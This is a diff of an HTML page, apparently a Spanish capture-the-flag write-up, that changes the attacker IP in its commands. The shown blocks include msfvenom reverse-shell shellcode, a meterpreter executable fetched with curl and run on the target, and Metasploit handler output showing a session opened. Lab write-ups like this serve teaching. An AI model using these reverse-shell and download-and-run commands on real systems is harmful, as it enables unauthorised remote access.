@@ -975,7 +975,7 @@ filesrv+0x11394:
 
 <p class="plain-text">Ya que podemos ejecutar un shellcode con este exploit solo nos queda generar un nuevo shellcode usando <code class="language-plaintext highlighter-rouge">msfvenom</code> que envie una reverse shell por el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.8.0.10 LPORT=443 -b </span><span class="am">'\x00\x09\x0a\x0b\x0c\x0d\x20\x25'</span><span class="p"> -f python -v shellcode -e x86/shikata_ga_nai -n 16  
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.8.0.100 LPORT=443 -b </span><span class="am">'\x00\x09\x0a\x0b\x0c\x0d\x20\x25'</span><span class="p"> -f python -v shellcode -e x86/shikata_ga_nai -n 16  
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 351 (iteration=0)
@@ -1172,11 +1172,11 @@ lhost => tun0
 lport => 4444
 [</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
 
-</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444</span>
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.100:4444</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/meterpreter/reverse_tcp LHOST=10.8.0.10 LPORT=4444 -f exe -o shell.exe  
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/meterpreter/reverse_tcp LHOST=10.8.0.100 LPORT=4444 -f exe -o shell.exe  
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -1190,7 +1190,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
 
 <p class="plain-text">Al descargarlo y ejecutarlo nos llega una sesión de meterpreter como el usuario <code class="language-plaintext highlighter-rouge">dev</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.10/shell.exe</span><span class="c1"> -o </span><span class="p">shell.exe  
+<code><span class="p">C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.100/shell.exe</span><span class="c1"> -o </span><span class="p">shell.exe  
 
 C:\ProgramData> </span><span class="am">shell.exe</span><span class="p">
 
@@ -1200,9 +1200,9 @@ C:\ProgramData></span>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
 
-</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.100:4444
 </span><span class="az">[*] </span><span class="p">Sending stage (176198 bytes) to 10.10.122.10
-</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.8.0.10:4444 -> 10.10.122.10:50647)  
+</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.8.0.100:4444 -> 10.10.122.10:50647)  
 
 (</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\shared) > getuid
 Server username: RAINBOW2\dev
